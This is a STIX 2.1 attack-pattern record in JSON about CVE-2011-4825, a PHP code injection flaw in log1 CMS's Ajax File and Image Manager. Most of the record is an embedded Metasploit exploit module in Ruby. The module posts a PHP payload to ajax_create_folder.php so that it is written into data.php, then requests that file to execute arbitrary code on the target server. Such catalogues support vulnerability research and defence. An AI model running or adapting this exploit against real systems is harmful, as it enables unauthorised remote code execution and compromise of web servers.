{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1e6636dc-1b19-4148-837f-aa6338523e92",
    "created": "2024-08-14T17:10:07.338637Z",
    "modified": "2024-08-14T17:10:07.338651Z",
    "name": "\"Log1 CMS writeInfo() PHP Code Injection\"",
    "description": " This module exploits the \"Ajax File and Image Manager\" component that can be found in log1 CMS.  In function.base.php of this component, the 'data' parameter in writeInfo() allows any malicious user to have direct control of writing data to file data.php, which results in arbitrary remote code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/log1cms_ajax_create_folder.rb",
            "external_id": "log1cms_ajax_create_folder.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4825"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Log1 CMS writeInfo() PHP Code Injection\",\n      'Description'    => %q{\n          This module exploits the \"Ajax File and Image Manager\" component that can be\n        found in log1 CMS.  In function.base.php of this component, the 'data' parameter\n        in writeInfo() allows any malicious user to have direct control of writing data\n        to file data.php, which results in arbitrary remote code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'EgiX',     #Found the bug in ajax_create_folder.php\n          'Adel SBM', #Found log1 CMS using the vulnerable ajax_create_folder.php\n          'sinn3r'    #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-4825'],\n          ['OSVDB', '76928'],\n          ['EDB', '18075'],  #Egix's advisory\n          ['EDB', '18151']   #Adel's\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['log1 CMS 2.0', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-04-11',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to log1 CMS', '/log1cms2.0/'])\n      ])\n  end\n\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1, 1] != '/'\n\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"admin/libraries/ajaxfilemanager/ajax_create_folder.php\")\n    })\n\n    if res and res.code == 200\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  def exploit\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1, 1] != '/'\n\n    peer = \"#{rhost}:#{rport}\"\n    php = %Q|#{rand_text_alpha(10)}=<?php #{payload.encoded} ?>|\n\n    print_status(\"Sending PHP payload (#{php.length.to_s} bytes)\")\n    send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"admin/libraries/ajaxfilemanager/ajax_create_folder.php\"),\n      'data'   => php\n    })\n\n    print_status(\"Requesting data.php\")\n    send_request_raw({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'admin/libraries/ajaxfilemanager/inc/data.php')\n    })\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-04-11",
    "x_mitre_platforms": [
        "php'"
    ]
}